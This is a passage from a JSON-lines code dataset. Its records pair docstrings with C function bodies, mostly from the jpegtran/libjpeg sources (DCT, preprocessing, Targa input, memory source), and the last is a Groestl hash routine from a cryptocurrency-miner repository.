*\n\t\t\tcinfo->max_h_samp_factor) / compptr->h_samp_factor),\n\t (JDIMENSION) cinfo->max_v_samp_factor);\n    }\n  }\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Process some data in the context case.\n */\n", "func_signal": "METHODDEF(void)\npre_process_context (j_compress_ptr cinfo,\n\t\t     JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,\n\t\t     JDIMENSION in_rows_avail,\n\t\t     JSAMPIMAGE output_buf, JDIMENSION *out_row_group_ctr,\n\t\t     JDIMENSION out_row_groups_avail)", "code": "{\n  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;\n  int numrows, ci;\n  int buf_height = cinfo->max_v_samp_factor * 3;\n  JDIMENSION inrows;\n\n  while (*out_row_group_ctr < out_row_groups_avail) {\n    if (*in_row_ctr < in_rows_avail) {\n      /* Do color conversion to fill the conversion buffer. */\n      inrows = in_rows_avail - *in_row_ctr;\n      numrows = prep->next_buf_stop - prep->next_buf_row;\n      numrows = (int) MIN((JDIMENSION) numrows, inrows);\n      (*cinfo->cconvert->color_convert) (cinfo, input_buf + *in_row_ctr,\n\t\t\t\t\t prep->color_buf,\n\t\t\t\t\t (JDIMENSION) prep->next_buf_row,\n\t\t\t\t\t numrows);\n      /* Pad at top of image, if first time through */\n      if (prep->rows_to_go == cinfo->image_height) {\n\tfor (ci = 0; ci < cinfo->num_components; ci++) {\n\t  int row;\n\t  for (row = 1; row <= cinfo->max_v_samp_factor; row++) {\n\t    jcopy_sample_rows(prep->color_buf[ci], 0,\n\t\t\t      prep->color_buf[ci], -row,\n\t\t\t      1, cinfo->image_width);\n\t  }\n\t}\n      }\n      *in_row_ctr += numrows;\n      prep->next_buf_row += numrows;\n      prep->rows_to_go -= numrows;\n    } else {\n      /* Return for more data, unless we are at the bottom of the image. */\n      if (prep->rows_to_go != 0)\n\tbreak;\n      /* When at bottom of image, pad to fill the conversion buffer. */\n      if (prep->next_buf_row < prep->next_buf_stop) {\n\tfor (ci = 0; ci < cinfo->num_components; ci++) {\n\t  expand_bottom_edge(prep->color_buf[ci], cinfo->image_width,\n\t\t\t     prep->next_buf_row, prep->next_buf_stop);\n\t}\n\tprep->next_buf_row = prep->next_buf_stop;\n      }\n    }\n    /* If we've gotten enough data, downsample a row group. */\n    if (prep->next_buf_row == prep->next_buf_stop) {\n      (*cinfo->downsample->downsample) (cinfo,\n\t\t\t\t\tprep->color_buf,\n\t\t\t\t\t(JDIMENSION) prep->this_row_group,\n\t\t\t\t\toutput_buf, *out_row_group_ctr);\n      (*out_row_group_ctr)++;\n      /* Advance pointers with wraparound as necessary. */\n      prep->this_row_group += cinfo->max_v_samp_factor;\n      if (prep->this_row_group >= buf_height)\n\tprep->this_row_group = 0;\n      if (prep->next_buf_row >= buf_height)\n\tprep->next_buf_row = 0;\n      prep->next_buf_stop = prep->next_buf_row + cinfo->max_v_samp_factor;\n    }\n  }\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Destruction of a JPEG object.\n *\n * Everything gets deallocated except the master jpeg_compress_struct itself\n * and the error manager struct.  Both of these are supplied by the application\n * and must be freed, if necessary, by the application.  (Often they are on\n * the stack and so don't need to be freed anyway.)\n * Closing a data source or destination, if necessary, is the application's\n * responsibility.\n */\n", "func_signal": "GLOBAL(void)\njpeg_destroy (j_common_ptr cinfo)", "code": "{\n  /* We need only tell the memory manager to release everything. */\n  /* NB: mem pointer is NULL if memory mgr failed to initialize. */\n  if (cinfo->mem != NULL)\n    (*cinfo->mem->self_destruct) (cinfo);\n  cinfo->mem = NULL;\t\t/* be safe if jpeg_destroy is called twice */\n  cinfo->global_state = 0;\t/* mark it destroyed */\n}", "path": "jcomapi.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_ifast (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JCOEFPTR coef_block,\n\t\t JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  DCTELEM tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  DCTELEM tmp10, tmp11, tmp12, tmp13;\n  DCTELEM z5, z10, z11, z12, z13;\n  JCOEFPTR inptr;\n  IFAST_MULT_TYPE * quantptr;\n  int * wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[DCTSIZE2];\t/* buffers data between passes */\n  SHIFT_TEMPS\t\t\t/* for DESCALE */\n  ISHIFT_TEMPS\t\t\t/* for IDESCALE */\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (IFAST_MULT_TYPE *) compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; ctr--) {\n    /* Due to quantization, we will usually find that many of the input\n     * coefficients are zero, especially the AC terms.  We can exploit this\n     * by short-circuiting the IDCT calculation for any column in which all\n     * the AC terms are zero.  In that case each output is equal to the\n     * DC coefficient (with scale factor as needed).\n     * With typical images and quantization tables, half or more of the\n     * column DCT calculations can be simplified this way.\n     */\n    \n    if (inptr[DCTSIZE*1] == 0 && inptr[DCTSIZE*2] == 0 &&\n\tinptr[DCTSIZE*3] == 0 && inptr[DCTSIZE*4] == 0 &&\n\tinptr[DCTSIZE*5] == 0 && inptr[DCTSIZE*6] == 0 &&\n\tinptr[DCTSIZE*7] == 0) {\n      /* AC terms all zero */\n      int dcval = (int) DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n\n      wsptr[DCTSIZE*0] = dcval;\n      wsptr[DCTSIZE*1] = dcval;\n      wsptr[DCTSIZE*2] = dcval;\n      wsptr[DCTSIZE*3] = dcval;\n      wsptr[DCTSIZE*4] = dcval;\n      wsptr[DCTSIZE*5] = dcval;\n      wsptr[DCTSIZE*6] = dcval;\n      wsptr[DCTSIZE*7] = dcval;\n      \n      inptr++;\t\t\t/* advance pointers to next column */\n      quantptr++;\n      wsptr++;\n      continue;\n    }\n    \n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE*2], quantptr[DCTSIZE*2]);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE*4], quantptr[DCTSIZE*4]);\n    tmp3 = DEQUANTIZE(inptr[DCTSIZE*6], quantptr[DCTSIZE*6]);\n\n    tmp10 = tmp0 + tmp2;\t/* phase 3 */\n    tmp11 = tmp0 - tmp2;\n\n    tmp13 = tmp1 + tmp3;\t/* phases 5-3 */\n    tmp12 = MULTIPLY(tmp1 - tmp3, FIX_1_414213562) - tmp13; /* 2*c4 */\n\n    tmp0 = tmp10 + tmp13;\t/* phase 2 */\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n    \n    /* Odd part */\n\n    tmp4 = DEQUANTIZE(inptr[DCTSIZE*1], quantptr[DCTSIZE*1]);\n    tmp5 = DEQUANTIZE(inptr[DCTSIZE*3], quantptr[DCTSIZE*3]);\n    tmp6 = DEQUANTIZE(inptr[DCTSIZE*5], quantptr[DCTSIZE*5]);\n    tmp7 = DEQUANTIZE(inptr[DCTSIZE*7], quantptr[DCTSIZE*7]);\n\n    z13 = tmp6 + tmp5;\t\t/* phase 6 */\n    z10 = tmp6 - tmp5;\n    z11 = tmp4 + tmp7;\n    z12 = tmp4 - tmp7;\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    wsptr[DCTSIZE*0] = (int) (tmp0 + tmp7);\n    wsptr[DCTSIZE*7] = (int) (tmp0 - tmp7);\n    wsptr[DCTSIZE*1] = (int) (tmp1 + tmp6);\n    wsptr[DCTSIZE*6] = (int) (tmp1 - tmp6);\n    wsptr[DCTSIZE*2] = (int) (tmp2 + tmp5);\n    wsptr[DCTSIZE*5] = (int) (tmp2 - tmp5);\n    wsptr[DCTSIZE*4] = (int) (tmp3 + tmp4);\n    wsptr[DCTSIZE*3] = (int) (tmp3 - tmp4);\n\n    inptr++;\t\t\t/* advance pointers to next column */\n    quantptr++;\n    wsptr++;\n  }\n  \n  /* Pass 2: process rows from work array, store into output array. */\n  /* Note that we must descale the results by a factor of 8 == 2**3, */\n  /* and also undo the PASS1_BITS scaling. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < DCTSIZE; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* Rows of zeroes can be exploited in the same way as we did with columns.\n     * However, the column calculation has created many nonzero AC terms, so\n     * the simplification applies less often (typically 5% to 10% of the time).\n     * On machines with very fast multiplication, it's possible that the\n     * test takes more time than it's worth.  In that case this section\n     * may be commented out.\n     */\n    \n#ifndef NO_ZERO_ROW_TEST\n    if (wsptr[1] == 0 && wsptr[2] == 0 && wsptr[3] == 0 && wsptr[4] == 0 &&\n\twsptr[5] == 0 && wsptr[6] == 0 && wsptr[7] == 0) {\n      /* AC terms all zero */\n      JSAMPLE dcval = range_limit[IDESCALE(wsptr[0], PASS1_BITS+3)\n\t\t\t\t  & RANGE_MASK];\n      \n      outptr[0] = dcval;\n      outptr[1] = dcval;\n      outptr[2] = dcval;\n      outptr[3] = dcval;\n      outptr[4] = dcval;\n      outptr[5] = dcval;\n      outptr[6] = dcval;\n      outptr[7] = dcval;\n\n      wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n      continue;\n    }\n#endif\n    \n    /* Even part */\n\n    tmp10 = ((DCTELEM) wsptr[0] + (DCTELEM) wsptr[4]);\n    tmp11 = ((DCTELEM) wsptr[0] - (DCTELEM) wsptr[4]);\n\n    tmp13 = ((DCTELEM) wsptr[2] + (DCTELEM) wsptr[6]);\n    tmp12 = MULTIPLY((DCTELEM) wsptr[2] - (DCTELEM) wsptr[6], FIX_1_414213562)\n\t    - tmp13;\n\n    tmp0 = tmp10 + tmp13;\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z13 = (DCTELEM) wsptr[5] + (DCTELEM) wsptr[3];\n    z10 = (DCTELEM) wsptr[5] - (DCTELEM) wsptr[3];\n    z11 = (DCTELEM) wsptr[1] + (DCTELEM) wsptr[7];\n    z12 = (DCTELEM) wsptr[1] - (DCTELEM) wsptr[7];\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = MULTIPLY(z11 - z13, FIX_1_414213562); /* 2*c4 */\n\n    z5 = MULTIPLY(z10 + z12, FIX_1_847759065); /* 2*c2 */\n    tmp10 = MULTIPLY(z12, FIX_1_082392200) - z5; /* 2*(c2-c6) */\n    tmp12 = MULTIPLY(z10, - FIX_2_613125930) + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    /* Final output stage: scale down by a factor of 8 and range-limit */\n\n    outptr[0] = range_limit[IDESCALE(tmp0 + tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[7] = range_limit[IDESCALE(tmp0 - tmp7, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[1] = range_limit[IDESCALE(tmp1 + tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[6] = range_limit[IDESCALE(tmp1 - tmp6, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[2] = range_limit[IDESCALE(tmp2 + tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[5] = range_limit[IDESCALE(tmp2 - tmp5, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[4] = range_limit[IDESCALE(tmp3 + tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n    outptr[3] = range_limit[IDESCALE(tmp3 - tmp4, PASS1_BITS+3)\n\t\t\t    & RANGE_MASK];\n\n    wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n}", "path": "jidctfst.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Finish up at end of pass.\n */\n", "func_signal": "METHODDEF(void)\nfinish_pass_master (j_compress_ptr cinfo)", "code": "{\n  my_master_ptr master = (my_master_ptr) cinfo->master;\n\n  /* The entropy coder always needs an end-of-pass call,\n   * either to analyze statistics or to flush its output buffer.\n   */\n  (*cinfo->entropy->finish_pass) (cinfo);\n\n  /* Update state for next pass */\n  switch (master->pass_type) {\n  case main_pass:\n    /* next pass is either output of scan 0 (after optimization)\n     * or output of scan 1 (if no optimization).\n     */\n    master->pass_type = output_pass;\n    if (! cinfo->optimize_coding)\n      master->scan_number++;\n    break;\n  case huff_opt_pass:\n    /* next pass is always output of current scan */\n    master->pass_type = output_pass;\n    break;\n  case output_pass:\n    /* next pass is either optimization or output of next scan */\n    if (cinfo->optimize_coding)\n      master->pass_type = huff_opt_pass;\n    master->scan_number++;\n    break;\n  }\n\n  master->pass_number++;\n}", "path": "jcmaster.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Abort processing of a JPEG compression or decompression operation,\n * but don't destroy the object itself.\n *\n * For this, we merely clean up all the nonpermanent memory pools.\n * Note that temp files (virtual arrays) are not allowed to belong to\n * the permanent pool, so we will be able to close all temp files here.\n * Closing a data source or destination, if necessary, is the application's\n * responsibility.\n */\n", "func_signal": "GLOBAL(void)\njpeg_abort (j_common_ptr cinfo)", "code": "{\n  int pool;\n\n  /* Do nothing if called on a not-initialized or destroyed JPEG object. */\n  if (cinfo->mem == NULL)\n    return;\n\n  /* Releasing pools in reverse order might help avoid fragmentation\n   * with some (brain-damaged) malloc libraries.\n   */\n  for (pool = JPOOL_NUMPOOLS-1; pool > JPOOL_PERMANENT; pool--) {\n    (*cinfo->mem->free_pool) (cinfo, pool);\n  }\n\n  /* Reset overall state for possible reuse of object */\n  if (cinfo->is_decompressor) {\n    cinfo->global_state = DSTATE_START;\n    /* Try to keep application from accessing now-deleted marker list.\n     * A bit kludgy to do it here, but this is the most central place.\n     */\n    ((j_decompress_ptr) cinfo)->marker_list = NULL;\n  } else {\n    cinfo->global_state = CSTATE_START;\n  }\n}", "path": "jcomapi.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Per-pass setup.\n * This is called at the beginning of each pass.  We determine which modules\n * will be active during this pass and give them appropriate start_pass calls.\n * We also set is_last_pass to indicate whether any more passes will be\n * required.\n */\n", "func_signal": "METHODDEF(void)\nprepare_for_pass (j_compress_ptr cinfo)", "code": "{\n  my_master_ptr master = (my_master_ptr) cinfo->master;\n\n  switch (master->pass_type) {\n  case main_pass:\n    /* Initial pass: will collect input data, and do either Huffman\n     * optimization or data output for the first scan.\n     */\n    select_scan_parameters(cinfo);\n    per_scan_setup(cinfo);\n    if (! cinfo->raw_data_in) {\n      (*cinfo->cconvert->start_pass) (cinfo);\n      (*cinfo->downsample->start_pass) (cinfo);\n      (*cinfo->prep->start_pass) (cinfo, JBUF_PASS_THRU);\n    }\n    (*cinfo->fdct->start_pass) (cinfo);\n    (*cinfo->entropy->start_pass) (cinfo, cinfo->optimize_coding);\n    (*cinfo->coef->start_pass) (cinfo,\n\t\t\t\t(master->total_passes > 1 ?\n\t\t\t\t JBUF_SAVE_AND_PASS : JBUF_PASS_THRU));\n    (*cinfo->main->start_pass) (cinfo, JBUF_PASS_THRU);\n    if (cinfo->optimize_coding) {\n      /* No immediate data output; postpone writing frame/scan headers */\n      master->pub.call_pass_startup = FALSE;\n    } else {\n      /* Will write frame/scan headers at first jpeg_write_scanlines call */\n      master->pub.call_pass_startup = TRUE;\n    }\n    break;\n#ifdef ENTROPY_OPT_SUPPORTED\n  case huff_opt_pass:\n    /* Do Huffman optimization for a scan after the first one. */\n    select_scan_parameters(cinfo);\n    per_scan_setup(cinfo);\n    if (cinfo->Ss != 0 || cinfo->Ah == 0) {\n      (*cinfo->entropy->start_pass) (cinfo, TRUE);\n      (*cinfo->coef->start_pass) (cinfo, JBUF_CRANK_DEST);\n      master->pub.call_pass_startup = FALSE;\n      break;\n    }\n    /* Special case: Huffman DC refinement scans need no Huffman table\n     * and therefore we can skip the optimization pass for them.\n     */\n    master->pass_type = output_pass;\n    master->pass_number++;\n    /*FALLTHROUGH*/\n#endif\n  case output_pass:\n    /* Do a data-output pass. */\n    /* We need not repeat per-scan setup if prior optimization pass did it. */\n    if (! cinfo->optimize_coding) {\n      select_scan_parameters(cinfo);\n      per_scan_setup(cinfo);\n    }\n    (*cinfo->entropy->start_pass) (cinfo, FALSE);\n    (*cinfo->coef->start_pass) (cinfo, JBUF_CRANK_DEST);\n    /* We emit frame/scan headers now */\n    if (master->scan_number == 0)\n      (*cinfo->marker->write_frame_header) (cinfo);\n    (*cinfo->marker->write_scan_header) (cinfo);\n    master->pub.call_pass_startup = FALSE;\n    break;\n  default:\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n  }\n\n  master->pub.is_last_pass = (master->pass_number == master->total_passes-1);\n\n  /* Set up progress monitor's pass info if present */\n  if (cinfo->progress != NULL) {\n    cinfo->progress->completed_passes = master->pass_number;\n    cinfo->progress->total_passes = master->total_passes;\n  }\n}", "path": "jcmaster.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Initialize for a processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_prep (j_compress_ptr cinfo, J_BUF_MODE pass_mode)", "code": "{\n  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;\n\n  if (pass_mode != JBUF_PASS_THRU)\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n\n  /* Initialize total-height counter for detecting bottom of image */\n  prep->rows_to_go = cinfo->image_height;\n  /* Mark the conversion buffer empty */\n  prep->next_buf_row = 0;\n#ifdef CONTEXT_ROWS_SUPPORTED\n  /* Preset additional state variables for context mode.\n   * These aren't used in non-context mode, so we needn't test which mode.\n   */\n  prep->this_row_group = 0;\n  /* Set next_buf_stop to stop after two row groups have been read in. */\n  prep->next_buf_stop = 2 * cinfo->max_v_samp_factor;\n#endif\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Prepare for input from a supplied memory buffer.\n * The buffer must contain the whole JPEG data.\n */\n", "func_signal": "GLOBAL(void)\njpeg_mem_src (j_decompress_ptr cinfo,\n\t      unsigned char * inbuffer, unsigned long insize)", "code": "{\n  struct jpeg_source_mgr * src;\n\n  if (inbuffer == NULL || insize == 0)\t/* Treat empty input as fatal error */\n    ERREXIT(cinfo, JERR_INPUT_EMPTY);\n\n  /* The source object is made permanent so that a series of JPEG images\n   * can be read from the same buffer by calling jpeg_mem_src only before\n   * the first one.\n   */\n  if (cinfo->src == NULL) {\t/* first time for this JPEG object? */\n    cinfo->src = (struct jpeg_source_mgr *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\t  SIZEOF(struct jpeg_source_mgr));\n  }\n\n  src = cinfo->src;\n  src->init_source = init_mem_source;\n  src->fill_input_buffer = fill_mem_input_buffer;\n  src->skip_input_data = skip_input_data;\n  src->resync_to_restart = jpeg_resync_to_restart; /* use default method */\n  src->term_source = term_source;\n  src->bytes_in_buffer = (size_t) insize;\n  src->next_input_byte = (JOCTET *) inbuffer;\n}", "path": "jdatasrc.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * This method loads the image into whole_image during the first call on\n * get_pixel_rows.  The get_pixel_rows pointer is then adjusted to call\n * get_memory_row on subsequent calls.\n */\n", "func_signal": "METHODDEF(JDIMENSION)\npreload_image (j_compress_ptr cinfo, cjpeg_source_ptr sinfo)", "code": "{\n  tga_source_ptr source = (tga_source_ptr) sinfo;\n  JDIMENSION row;\n  cd_progress_ptr progress = (cd_progress_ptr) cinfo->progress;\n\n  /* Read the data into a virtual array in input-file row order. */\n  for (row = 0; row < cinfo->image_height; row++) {\n    if (progress != NULL) {\n      progress->pub.pass_counter = (long) row;\n      progress->pub.pass_limit = (long) cinfo->image_height;\n      (*progress->pub.progress_monitor) ((j_common_ptr) cinfo);\n    }\n    source->pub.buffer = (*cinfo->mem->access_virt_sarray)\n      ((j_common_ptr) cinfo, source->whole_image, row, (JDIMENSION) 1, TRUE);\n    (*source->get_pixel_rows) (cinfo, sinfo);\n  }\n  if (progress != NULL)\n    progress->completed_extra_passes++;\n\n  /* Set up to read from the virtual array in unscrambled order */\n  source->pub.get_pixel_rows = get_memory_row;\n  source->current_row = 0;\n  /* And read the first row */\n  return get_memory_row(cinfo, sinfo);\n}", "path": "rdtarga.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Special start-of-pass hook.\n * This is called by jpeg_write_scanlines if call_pass_startup is TRUE.\n * In single-pass processing, we need this hook because we don't want to\n * write frame/scan headers during jpeg_start_compress; we want to let the\n * application write COM markers etc. between jpeg_start_compress and the\n * jpeg_write_scanlines loop.\n * In multi-pass processing, this routine is not used.\n */\n", "func_signal": "METHODDEF(void)\npass_startup (j_compress_ptr cinfo)", "code": "{\n  cinfo->master->call_pass_startup = FALSE; /* reset flag so call only once */\n\n  (*cinfo->marker->write_frame_header) (cinfo);\n  (*cinfo->marker->write_scan_header) (cinfo);\n}", "path": "jcmaster.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Read the file header; return image size and component count.\n */\n", "func_signal": "METHODDEF(void)\nstart_input_tga (j_compress_ptr cinfo, cjpeg_source_ptr sinfo)", "code": "{\n  tga_source_ptr source = (tga_source_ptr) sinfo;\n  U_CHAR targaheader[18];\n  int idlen, cmaptype, subtype, flags, interlace_type, components;\n  unsigned int width, height, maplen;\n  boolean is_bottom_up;\n\n#define GET_2B(offset)\t((unsigned int) UCH(targaheader[offset]) + \\\n\t\t\t (((unsigned int) UCH(targaheader[offset+1])) << 8))\n\n  if (! ReadOK(source->pub.input_file, targaheader, 18))\n    ERREXIT(cinfo, JERR_INPUT_EOF);\n\n  /* Pretend \"15-bit\" pixels are 16-bit --- we ignore attribute bit anyway */\n  if (targaheader[16] == 15)\n    targaheader[16] = 16;\n\n  idlen = UCH(targaheader[0]);\n  cmaptype = UCH(targaheader[1]);\n  subtype = UCH(targaheader[2]);\n  maplen = GET_2B(5);\n  width = GET_2B(12);\n  height = GET_2B(14);\n  source->pixel_size = UCH(targaheader[16]) >> 3;\n  flags = UCH(targaheader[17]);\t/* Image Descriptor byte */\n\n  is_bottom_up = ((flags & 0x20) == 0);\t/* bit 5 set => top-down */\n  interlace_type = flags >> 6;\t/* bits 6/7 are interlace code */\n\n  if (cmaptype > 1 ||\t\t/* cmaptype must be 0 or 1 */\n      source->pixel_size < 1 || source->pixel_size > 4 ||\n      (UCH(targaheader[16]) & 7) != 0 || /* bits/pixel must be multiple of 8 */\n      interlace_type != 0)\t/* currently don't allow interlaced image */\n    ERREXIT(cinfo, JERR_TGA_BADPARMS);\n  \n  if (subtype > 8) {\n    /* It's an RLE-coded file */\n    source->read_pixel = read_rle_pixel;\n    source->block_count = source->dup_pixel_count = 0;\n    subtype -= 8;\n  } else {\n    /* Non-RLE file */\n    source->read_pixel = read_non_rle_pixel;\n  }\n\n  /* Now should have subtype 1, 2, or 3 */\n  components = 3;\t\t/* until proven different */\n  cinfo->in_color_space = JCS_RGB;\n\n  switch (subtype) {\n  case 1:\t\t\t/* Colormapped image */\n    if (source->pixel_size == 1 && cmaptype == 1)\n      source->get_pixel_rows = get_8bit_row;\n    else\n      ERREXIT(cinfo, JERR_TGA_BADPARMS);\n    TRACEMS2(cinfo, 1, JTRC_TGA_MAPPED, width, height);\n    break;\n  case 2:\t\t\t/* RGB image */\n    switch (source->pixel_size) {\n    case 2:\n      source->get_pixel_rows = get_16bit_row;\n      break;\n    case 3:\n      source->get_pixel_rows = get_24bit_row;\n      break;\n    case 4:\n      source->get_pixel_rows = get_32bit_row;\n      break;\n    default:\n      ERREXIT(cinfo, JERR_TGA_BADPARMS);\n      break;\n    }\n    TRACEMS2(cinfo, 1, JTRC_TGA, width, height);\n    break;\n  case 3:\t\t\t/* Grayscale image */\n    components = 1;\n    cinfo->in_color_space = JCS_GRAYSCALE;\n    if (source->pixel_size == 1)\n      source->get_pixel_rows = get_8bit_gray_row;\n    else\n      ERREXIT(cinfo, JERR_TGA_BADPARMS);\n    TRACEMS2(cinfo, 1, JTRC_TGA_GRAY, width, height);\n    break;\n  default:\n    ERREXIT(cinfo, JERR_TGA_BADPARMS);\n    break;\n  }\n\n  if (is_bottom_up) {\n    /* Create a virtual array to buffer the upside-down image. */\n    source->whole_image = (*cinfo->mem->request_virt_sarray)\n      ((j_common_ptr) cinfo, JPOOL_IMAGE, FALSE,\n       (JDIMENSION) width * components, (JDIMENSION) height, (JDIMENSION) 1);\n    if (cinfo->progress != NULL) {\n      cd_progress_ptr progress = (cd_progress_ptr) cinfo->progress;\n      progress->total_extra_passes++; /* count file input as separate pass */\n    }\n    /* source->pub.buffer will point to the virtual array. */\n    source->pub.buffer_height = 1; /* in case anyone looks at it */\n    source->pub.get_pixel_rows = preload_image;\n  } else {\n    /* Don't need a virtual array, but do need a one-row input buffer. */\n    source->whole_image = NULL;\n    source->pub.buffer = (*cinfo->mem->alloc_sarray)\n      ((j_common_ptr) cinfo, JPOOL_IMAGE,\n       (JDIMENSION) width * components, (JDIMENSION) 1);\n    source->pub.buffer_height = 1;\n    source->pub.get_pixel_rows = source->get_pixel_rows;\n  }\n  \n  while (idlen--)\t\t/* Throw away ID field */\n    (void) read_byte(source);\n\n  if (maplen > 0) {\n    if (maplen > 256 || GET_2B(3) != 0)\n      ERREXIT(cinfo, JERR_TGA_BADCMAP);\n    /* Allocate space to store the colormap */\n    source->colormap = (*cinfo->mem->alloc_sarray)\n      ((j_common_ptr) cinfo, JPOOL_IMAGE, (JDIMENSION) maplen, (JDIMENSION) 3);\n    /* and read it from the file */\n    read_colormap(source, (int) maplen, UCH(targaheader[7]));\n  } else {\n    if (cmaptype)\t\t/* but you promised a cmap! */\n      ERREXIT(cinfo, JERR_TGA_BADPARMS);\n    source->colormap = NULL;\n  }\n\n  cinfo->input_components = components;\n  cinfo->data_precision = 8;\n  cinfo->image_width = width;\n  cinfo->image_height = height;\n}", "path": "rdtarga.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Convenience routines for allocating quantization and Huffman tables.\n * (Would jutils.c be a more reasonable place to put these?)\n */\n", "func_signal": "GLOBAL(JQUANT_TBL *)\njpeg_alloc_quant_table (j_common_ptr cinfo)", "code": "{\n  JQUANT_TBL *tbl;\n\n  tbl = (JQUANT_TBL *)\n    (*cinfo->mem->alloc_small) (cinfo, JPOOL_PERMANENT, SIZEOF(JQUANT_TBL));\n  tbl->sent_table = FALSE;\t/* make sure this is false in any new table */\n  return tbl;\n}", "path": "jcomapi.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/* given state h, do h <- P(h)+h */\n", "func_signal": "static void OutputTransformation(groestlHashState *ctx)", "code": "{\n  int j;\n  uint32_t temp[2*COLS512];\n  uint32_t y[2*COLS512];\n  uint32_t z[2*COLS512];\n\n\n\n\tfor (j = 0; j < 2*COLS512; j++) {\n\t  temp[j] = ctx->chaining[j];\n\t}\n\tRND512P((uint8_t*)temp, y, 0x00000000);\n\tRND512P((uint8_t*)y, z, 0x00000001);\n\tRND512P((uint8_t*)z, y, 0x00000002);\n\tRND512P((uint8_t*)y, z, 0x00000003);\n\tRND512P((uint8_t*)z, y, 0x00000004);\n\tRND512P((uint8_t*)y, z, 0x00000005);\n\tRND512P((uint8_t*)z, y, 0x00000006);\n\tRND512P((uint8_t*)y, z, 0x00000007);\n\tRND512P((uint8_t*)z, y, 0x00000008);\n\tRND512P((uint8_t*)y, temp, 0x00000009);\n\tfor (j = 0; j < 2*COLS512; j++) {\n\t  ctx->chaining[j] ^= temp[j];\n\t}\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
